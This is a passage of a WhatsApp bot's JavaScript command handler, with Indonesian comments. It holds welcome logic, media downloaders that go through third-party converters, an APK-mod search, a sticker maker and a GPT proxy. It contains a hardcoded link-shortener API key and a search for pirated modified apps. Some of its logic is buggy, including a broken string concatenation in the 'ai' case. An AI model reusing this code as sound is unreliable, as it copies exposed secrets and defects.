    } catch (e) {
        console.error("Error reading user last interaction file:", e);
    }
    return {};
}

async function writeUserLastInteraction(data) {
    try {
        const dir = path.dirname(USER_LAST_INTERACTION_FILE);
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
        await fs.promises.writeFile(USER_LAST_INTERACTION_FILE, JSON.stringify(data, null, 2), 'utf8');
    } catch (e) {
        console.error("Error writing user last interaction file:", e);
    }
}

// --- Variables to store loaded data (initialized with empty objects) ---
// These will be loaded when the first message arrives.
let welcomeSettings = {};
let userLastInteractions = {};
let isWelcomeDataLoaded = false; // Flag to ensure data is loaded only once

// Example: The start of your main message processing function in case.txt
// Sky = async (Sky, m, ... ) => {

    // >>> TEMPATKAN LOGIKA LOADING INI DI AWAL FUNGSI HANDLER UTAMA <<<
    if (!isWelcomeDataLoaded) {
        
        welcomeSettings = await readWelcomeSettings();
        userLastInteractions = await readUserLastInteraction();
        isWelcomeDataLoaded = true;
        
    }
    // >>> AKHIR LOGIKA LOADING <<<

    // Ambil ID pengirim
    const senderId = m.sender;

    // Perbarui waktu interaksi terakhir pengguna
    userLastInteractions[senderId] = userLastInteractions[senderId] || {};
    userLastInteractions[senderId].lastInteraction = Date.now();

    // --- Logika Sambutan Pengguna Baru/Tidak Aktif ---
    if (welcomeSettings.new_user.enabled) {
        const lastInteractionTime = userLastInteractions[senderId].lastInteraction || 0;
        const lastNewUserWelcomeSent = userLastInteractions[senderId].lastNewUserWelcome || 0;
        const currentTime = Date.now();
        const daysInactiveMs = welcomeSettings.new_user.days_inactive * 24 * 60 * 60 * 1000;
        const minDelayBetweenNewUserWelcome = 7 * 24 * 60 * 60 * 1000;

        if ((lastInteractionTime === 0 || (currentTime - lastInteractionTime > daysInactiveMs)) &&
            (currentTime - lastNewUserWelcomeSent > minDelayBetweenNewUserWelcome)) {

            const userName = m.pushName || 'Pengguna';
            let welcomeMsg = welcomeSettings.new_user.message.replace('{nama}', userName);

            await Sky.sendMessage(m.chat, { text: welcomeMsg });
            
            userLastInteractions[senderId].lastNewUserWelcome = currentTime;
            console.log(`Sent new/inactive user welcome to ${senderId}`);
        }
    }

    // --- Logika Sambutan Akhir Pekan (jika Anda menggunakannya) ---
    if (welcomeSettings.weekend.enabled) {
        const today = momentTimezone().tz("Asia/Makassar").day();
        const { start_day, end_day } = welcomeSettings.weekend;

        const isWeekend = (today >= start_day && today <= end_day);

        const lastWeekendWelcomeSent = userLastInteractions[senderId].lastWeekendWelcome || 0;
        const now = Date.now();
        const oneDayMs = 24 * 60 * 60 * 1000;

        if (isWeekend && (now - lastWeekendWelcomeSent > oneDayMs)) {
            const userName = m.pushName || 'Pengguna';
            let welcomeMsg = welcomeSettings.weekend.message.replace('{nama}', userName);

            await Sky.sendMessage(m.chat, { text: welcomeMsg });

            userLastInteractions[senderId].lastWeekendWelcome = now;
            console.log(`Sent weekend welcome to ${senderId}`);
        }
    }

    // --- Logika Sambutan Global (jika Anda menggunakannya) ---
    if (welcomeSettings.global_welcome.enabled) {
        const currentTime = Date.now();
        const lastSentTime = welcomeSettings.global_welcome.last_sent_time || 0;
        const cooldownMs = welcomeSettings.global_welcome.cooldown_minutes * 60 * 1000;

        if (currentTime - lastSentTime > cooldownMs) {
            const userName = m.pushName || 'Pengguna';
            let welcomeMsg = welcomeSettings.global_welcome.message.replace('{nama}', userName);

            await Sky.sendMessage(m.chat, { text: welcomeMsg });

            welcomeSettings.global_welcome.last_sent_time = currentTime;
            await writeWelcomeSettings(welcomeSettings); // Save settings after global welcome send
            console.log(`Sent global welcome. Next send in ${welcomeSettings.global_welcome.cooldown_minutes} minutes.`);
        }
    }

    // ... (Your existing 'if (m.text.toLowerCase() == "bot")' and 'if (budy.startsWith("=>"))' etc.)
    // ... (Your switch(command) block will come after all the welcome logic)
await writeUserLastInteraction(userLastInteractions);

// =========================
// 🎲 FITUR GACHA WHATSAPP (FINAL BUILD - API VERSION)
// =========================

require('dotenv').config()
// Lokasi penyimpanan limit user
const limitFile = path.join(__dirname, '/library/database/limit_spin.json')
if (!fs.existsSync(limitFile)) fs.writeFileSync(limitFile, '[]')

const loadLimitData = () => JSON.parse(fs.readFileSync(limitFile))
const saveLimitData = (data) => {
    fs.writeFileSync(limitFile, JSON.stringify(data, null, 2))
    // Backup otomatis ke channel owner
    Sky.sendMessage('0029VbBUCDiHwXb9QGiyXH0C@newsletter', {
        text: `📦 *Backup Data Limit Spin:*\n\`\`\`${JSON.stringify(data, null, 2)}\`\`\``
    })
}

// Reset otomatis tiap jam 00:00
setInterval(() => {
    const now = new Date()
    if (now.getHours() === 0 && now.getMinutes() === 0) {
        saveLimitData([])
        console.log("✅ Limit harian direset otomatis (00:00).")
    }
}, 60 * 1000)

// =========================
// 🔗 Ambil file dari Google Drive (API KEY)
// =========================
async function getDriveFiles(folderId) {
    try {
        const apiKey = process.env.GDRIVE_API_KEY
        const endpoint = `https://www.googleapis.com/drive/v3/files?q='${folderId}' in parents and trashed=false&fields=files(id,name,mimeType)&key=${apiKey}`

        const res = await fetch(endpoint)
        const data = await res.json()

        if (data.error) throw new Error(data.error.message)
        if (!data.files || data.files.length === 0) throw new Error("⚠️ Tidak ditemukan file gacha di folder Google Drive.")

        return data.files.map(f => ({
            name: f.name,
            url: `https://drive.google.com/uc?id=${f.id}`
        }))
    } catch (err) {
        console.error(err)
        throw new Error("❌ Gagal mengambil data dari Google Drive API.")
    }
}
const metadata = m.isGroup ? await Sky.groupMetadata(m.chat).catch(e => {}) : (m.chat.endsWith('g.us') ? await Sky.groupMetadata(m.chat).catch(e => {}) : {});
//==============================================

switch (command) {
case 'play': {
  if (!text) return m.reply(example("alone alan walker"))

  try {
    const axios = require('axios')
    const yts = require('yt-search')

    await Sky.sendMessage(m.chat, { react: { text: '🔎', key: m.key }})

    const search = await yts(text)
    if (!search.videos.length)
      return m.reply('❌ Lagu ga ketemu')

    const vid = search.videos[0]

    // ===== SCRAPE =====
    const headers = {
      accept: "application/json",
      "content-type": "application/json",
      "user-agent": "Mozilla/5.0 (Android)",
      referer: "https://ytmp3.gg/"
    }

    const payload = {
      url: vid.url,
      os: "android",
      output: { type: "audio", format: "mp3" },
      audio: { bitrate: "128k" }
    }

    const req = async (u) =>
      axios.post(`https://${u}.ytconvert.org/api/download`, payload, { headers })

    const { data } = await req("hub").catch(() => req("api"))

    // polling
    let result
    while (true) {
      const poll = await axios.get(data.statusUrl, { headers })
      if (poll.data.status === "completed") {
        result = poll.data
        break
      }
      if (poll.data.status === "failed")
        return m.reply('❌ Convert gagal')
      await new Promise(r => setTimeout(r, 1500))
    }

    await Sky.sendMessage(m.chat, {
      audio: { url: result.downloadUrl },
      mimetype: "audio/mpeg",
      contextInfo: {
        externalAdReply: {
          title: vid.title,
          body: `${vid.author.name} • ${vid.timestamp}`,
          thumbnailUrl: vid.thumbnail,
          sourceUrl: vid.url,
          renderLargerThumbnail: true,
          mediaType: 1
        }
      }
    }, { quoted: m })

    await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key }})

  } catch (e) {
    console.error(e)
    await Sky.sendMessage(m.chat, { react: { text: '❌', key: m.key }})
    m.reply('❌ Gagal play audio')
  }
}
break
//================================================================================

case 'playvid': {
  if (!text) return m.reply(example("dj tiktok"))

  try {
    const axios = require('axios')
    const yts = require('yt-search')

    const [query, qReq] = text.split('|').map(v => v.trim())
    const quality = qReq || null

    await Sky.sendMessage(m.chat, { react: { text: '🔎', key: m.key }})

    const search = await yts(query)
    if (!search.videos.length)
      return m.reply('❌ Video ga ketemu')

    const vid = search.videos[0]

    const availableQ = ["144p","240p","360p","480p","720p","1080p"]

    if (!quality)
      return m.reply(
        `📺 *Resolusi tersedia:*\n${availableQ.join(", ")}\n\n` +
        `💡 Contoh:\n.playvid ${query} | 720p`
      )

    if (!availableQ.includes(quality))
      return m.reply(
        `❌ Resolusi tidak valid\n\nTersedia: ${availableQ.join(", ")}`
      )

    await Sky.sendMessage(m.chat, { react: { text: '⚙️', key: m.key }})

    const headers = {
      accept: "application/json",
      "content-type": "application/json",
      "user-agent": "Mozilla/5.0 (Android)",
      referer: "https://ytmp3.gg/"
    }

    const payload = {
      url: vid.url,
      os: "android",
      output: { type: "video", format: "mp4", quality }
    }

    const req = async (u) =>
      axios.post(`https://${u}.ytconvert.org/api/download`, payload, { headers })

    const { data } = await req("hub").catch(() => req("api"))

    let result
    while (true) {
      const poll = await axios.get(data.statusUrl, { headers })
      if (poll.data.status === "completed") {
        result = poll.data
        break
      }
      if (poll.data.status === "failed")
        return m.reply('❌ Convert gagal')
      await new Promise(r => setTimeout(r, 1500))
    }

    await Sky.sendMessage(m.chat, {
      video: { url: result.downloadUrl },
      mimetype: "video/mp4",
      caption: `🎥 ${vid.title}\nResolusi: ${quality}`,
      ptv: true
    }, { quoted: m })

    await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key }})

  } catch (e) {
    console.error(e)
    await Sky.sendMessage(m.chat, { react: { text: '❌', key: m.key }})
    m.reply('❌ Gagal play video')
  }
}
break

//===============================================================================

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await Sky.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}
break

//===============================================================================

case 'ytmp3': {
  if (!text) return m.reply(example("link youtube"))

  try {
    const axios = require('axios')

    await Sky.sendMessage(m.chat, { react: { text: '🕖', key: m.key }})

    // ambil metadata youtube
    const { data: meta } = await axios.get(
      'https://www.youtube.com/oembed',
      { params: { url: text, format: 'json' } }
    )

    const headers = {
      accept: "application/json",
      "content-type": "application/json",
      "user-agent": "Mozilla/5.0 (Android)",
      referer: "https://ytmp3.gg/"
    }

    const payload = {
      url: text,
      os: "android",
      output: { type: "audio", format: "mp3" },
      audio: { bitrate: "128k" }
    }

    const req = async (u) =>
      axios.post(`https://${u}.ytconvert.org/api/download`, payload, { headers })

    const { data } = await req("hub").catch(() => req("api"))

    let result
    while (true) {
      const poll = await axios.get(data.statusUrl, { headers })
      if (poll.data.status === "completed") {
        result = poll.data
        break
      }
      if (poll.data.status === "failed")
        return m.reply('❌ Convert gagal')
      await new Promise(r => setTimeout(r, 1500))
    }

    await Sky.sendMessage(m.chat, {
      audio: { url: result.downloadUrl },
      mimetype: "audio/mpeg",
      contextInfo: {
        externalAdReply: {
          title: meta.title,
          body: meta.author_name,
          thumbnailUrl: `https://i.ytimg.com/vi/${text.split('v=')[1]?.split('&')[0]}/hqdefault.jpg`,
          sourceUrl: text,
          renderLargerThumbnail: true,
          mediaType: 1
        }
      }
    }, { quoted: m })

    await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key }})

  } catch (e) {
    console.error(e)
    await Sky.sendMessage(m.chat, { react: { text: '❌', key: m.key }})
    m.reply('❌ Gagal download audio')
  }
}
break

//================================================================================

case 'ytmp4': {
  if (!text) return m.reply(example("link youtube | 720p"))

  try {
    const axios = require('axios')
    const [url, quality = "720p"] = text.split('|').map(v => v.trim())

    await Sky.sendMessage(m.chat, { react: { text: '🕖', key: m.key }})

    const { data: meta } = await axios.get(
      'https://www.youtube.com/oembed',
      { params: { url, format: 'json' } }
    )

    const headers = {
      accept: "application/json",
      "content-type": "application/json",
      "user-agent": "Mozilla/5.0 (Android)",
      referer: "https://ytmp3.gg/"
    }

    const payload = {
      url,
      os: "android",
      output: { type: "video", format: "mp4", quality }
    }

    const req = async (u) =>
      axios.post(`https://${u}.ytconvert.org/api/download`, payload, { headers })

    const { data } = await req("hub").catch(() => req("api"))

    let result
    while (true) {
      const poll = await axios.get(data.statusUrl, { headers })
      if (poll.data.status === "completed") {
        result = poll.data
        break
      }
      if (poll.data.status === "failed")
        return m.reply('❌ Convert gagal')
      await new Promise(r => setTimeout(r, 1500))
    }

    await Sky.sendMessage(m.chat, {
      video: { url: result.downloadUrl },
      mimetype: "video/mp4",
      caption: `🎥 ${meta.title}\n👤 ${meta.author_name}\n📺 ${quality}`,
      contextInfo: {
        externalAdReply: {
          title: meta.title,
          body: meta.author_name,
          thumbnailUrl: meta.thumbnail_url,
          sourceUrl: url,
          renderLargerThumbnail: true,
          mediaType: 2
        }
      }
    }, { quoted: m })

    await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key }})

  } catch (e) {
    console.error(e)
    await Sky.sendMessage(m.chat, { react: { text: '❌', key: m.key }})
    m.reply('❌ Gagal download video')
  }
}
break
//================================================================================

case "mediafireeror": {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await Sky.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error! Result Not Found"))
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await Sky.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await Sky.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

/*
Jangan Hapus Wm Bang 

*Happy Mod Search  Plugins Esm*

Maaf Lama Up nya 

*[Sumber]*
https://whatsapp.com/channel/0029Vb3u2awADTOCXVsvia28

*[Sumber Scrape]*

https://whatsapp.com/channel/0029VadfVP5ElagswfEltW0L/2186
*/
case 'apkmod' : {
const axios = require('axios');
const cheerio = require('cheerio');

async function getMod(q) {
    try {
        const anu = `https://happymod.com/search.html?q=${q}`;
        const { data } = await axios.get(anu);
        const $ = cheerio.load(data);

        let result = [];

        $(".pdt-app-box").each((_, el) => {
            const title = $(el).find("h3").text().trim();
            const link = "https://happymod.com" + $(el).find('a').attr('href');
            const rate = $(el).find("span.a-search-num").text().trim();

            result.push({ title, link, rate });
        });

        return result;
    } catch (e) {
        console.error(e);
        return [];
    }
}

    if (!text) return m.reply('Mau Cari Aplikasi Apa? \n\n *Example :* .apkmod Minecraft');
    
    await Sky.sendMessage(m.chat, {react:  {text: '🕒', key: m.key}});

    try {
        const data = await getMod(text);

        if (data.length === 0) {
            await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}});
            return m.reply('Gak Ketemu');
        }

        let teks = `*Happymod Search*\n\n`;

        for (let i = 0; i < Math.min(data.length, 15); i++) {
            teks += `*${i + 1}. ${data[i].title}*\n`;
            teks += `Rating : ${data[i].rate}\n`;
            teks += `Link : ${data[i].link}\n\n`;
        }

        await Sky.sendMessage(m.chat, { image: { url: "https://i.postimg.cc/c6q7zRC8/1741529921037.png" }, caption: teks });

        await Sky.sendMessage(m.chat, {react:  {text: '✅', key: m.key}});
    } catch (error) {
        console.error(error);
        await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}});
        m.reply('Error');
    }
};

break
//================================================================================

case "instagrameror": case "igdleror": case "igeror": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await Sky.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://vapis.my.id/api/igdl?url=${text}`).then(async (res) => {
await Sky.sendMessage(m.chat, {video: {url: res.result[0].url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Sky.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! Repositori Tidak Ditemukan`)
}}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await Sky.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: Sky.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Sky.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await Sky.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await Sky.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break


case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await Sky.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await Sky.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Sky.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//================================================================================

case "pineror": case "pinteresteror": {
if (!text) return m.reply(example("anime dark"))
await Sky.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: Sky.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Sky.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case 'ai': case 'gpt': case 'openai': {
  if (!text) return m.reply(example("hai"));

  try {
    await Sky.sendMessage(m.chat, {
      react: { text: "⏳", key: m.key }
    });

    let apiUrl = `https://zenzxz.dpdns.org/ai/gpt4o?prompt=${encodeURIComponent(text)}`;

    let response = await axios.get(apiUrl);
    let apiResponseData = response.data;

    console.log("DEBUG: Full API Response Data:", JSON.stringify(apiResponseData, null, 2));

    if (!apiResponseData.status) {
      console.log("DEBUG: API Top-level status is false.");
      return m.reply("❌ Gagal mendapatkan respons dari AI. Status API adalah false.");
    }

    if (!apiResponseData.result || apiResponseData.result.status !== 'success' || !apiResponseData.result.data) {
      const apiMsg = apiResponseData.result && apiResponseData.result.msg ? apiResponseData.result.msg : 'Tidak ada pesan kesalahan spesifik dari API.';
      console.log("DEBUG: Error in nested result or data:", apiMsg);
      return m.reply(`❌ Gagal mendapatkan respons dari AI. Pesan dari API: ${apiMsg}`);
    }

    let aiAnswer = apiResponseData.result.data;
    console.log("DEBUG: Extracted AI Answer:", aiAnswer);

    let replyMsg = `🤖 *GPT4O-AI Chatbot*\n\n` +
                   `💬 *Pertanyaan:* ${text}\n` +
                   `🧠 *Jawaban:* ${aiAnswer}\n\n` +
    
    console.log("DEBUG: Constructed Reply Message:", replyMsg);

    // ---- PERBAIKAN UTAMA DI SINI ----
    await m.reply(replyMsg); // Tambahkan 'await' di sini
    // ----------------------------------

    await Sky.sendMessage(m.chat, {
      react: { text: "✅", key: m.key }
    });

  } catch (error) {
    console.error("DEBUG: Caught error in AI command:", error);
    await Sky.sendMessage(m.chat, {react:  {text: '❌', key: m.key}}); // Tambahkan reaksi error jika terjadi di catch block
    m.reply(`❌ Terjadi kesalahan saat menghubungi AI. Mungkin ada masalah jaringan atau API. Error: ${error.message || error}`);
  }
};
break;


//================================================================================

case "brat": {
if (!text) return m.reply(example('teksnya'))
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let res = await getBuffer (`https://brat.siputzx.my.id/image?text=${encodeURIComponent(text)}`)
await Sky.sendAsSticker(m.chat, res, m, {packname: global.packname})
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "brat2": {
  if (!text) return m.reply(example('teksnya'))
  await Sky.sendMessage(m.chat, { react: { text: '🕒', key: m.key } })

  const fs = require('fs')
  const { exec } = require('child_process')
  const Jimp = require('jimp')
  const path = require('path')
  const crypto = require('crypto')

  const sampah = 'library/database/sampah'
  if (!fs.existsSync(sampah)) fs.mkdirSync(sampah, { recursive: true })

  const rand = crypto.randomBytes(6).toString('hex')
  const input = path.join(sampah, `brat_raw_${rand}.png`)
  const up = path.join(sampah, `brat_up_${rand}.png`)
  const finalPng = path.join(sampah, `brat_final_${rand}.png`)
  const out = path.join(sampah, `brat_${rand}.webp`)

  try {
    // 1️⃣ ambil gambar
    let res = await getBuffer(`https://brat.siputzx.my.id/image?text=${encodeURIComponent(text)}`)
    fs.writeFileSync(input, res)

    // 2️⃣ upscale + sharpen
    await new Promise((resolve, reject) => {
      exec(
        `ffmpeg -y -i "${input}" -vf "scale=iw*3:ih*3:flags=lanczos,unsharp=7:7:1.5" "${up}"`,
        err => err ? reject(err) : resolve()
      )
    })

    // 3️⃣ finishing jimp
    const img = await Jimp.read(up)
    await img
      .contrast(0.3)
      .brightness(0.04)
      .resize(512, 512, Jimp.RESIZE_LANCZOS)
      .writeAsync(finalPng)

    // 4️⃣ convert ke webp HQ
    await new Promise((resolve, reject) => {
      exec(
        `ffmpeg -y -i "${finalPng}" -vcodec libwebp -lossless 1 -quality 100 -preset picture "${out}"`,
        err => err ? reject(err) : resolve()
      )
    })

    await Sky.sendAsSticker(m.chat, fs.readFileSync(out), m, {
      packname: global.packname
    })

  } catch (e) {
    console.error(e)
    m.reply('❌ gagal bikin stiker')
  } finally {
    // cleanup aman
    for (let f of [input, up, finalPng, out]) {
      if (fs.existsSync(f)) fs.unlinkSync(f)
    }
  }

  await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
}
break


//================================================================================

case "bratip": {
if (!text) return m.reply(example('teksnya'))
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let res = await getBuffer(`https://flowfalcon.dpdns.org/imagecreator/brat?text=${encodeURIComponent(text)}`)
await Sky.sendAsSticker(m.chat, res, m, {packname: global.packname})
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

        
        
case "qc": {
if (!text) return m.reply(example('teksnya'))
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await Sky.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await Sky.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
var image = await Sky.downloadAndSaveMediaMessage(qmsg)
await Sky.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break

//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
var image = await Sky.downloadAndSaveMediaMessage(qmsg)
await Sky.sendAsSticker(m.chat, image, m, {packname: text, author: 'Rafz Bot By Rafflie Aditya'})
await fs.unlinkSync(image)
}
